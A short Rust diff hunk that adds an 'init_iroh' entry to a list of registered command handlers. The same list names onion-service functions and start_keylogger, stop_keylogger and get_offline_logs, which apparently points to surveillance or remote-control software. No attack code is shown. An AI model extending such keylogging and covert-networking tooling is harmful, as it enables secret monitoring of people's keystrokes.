@@ -98,6 +98,7 @@ async fn main() {
             create_onion,
             delete_onion,
             check_onion_reachability,
+            init_iroh,
             start_keylogger,
             stop_keylogger,
             get_offline_logs,
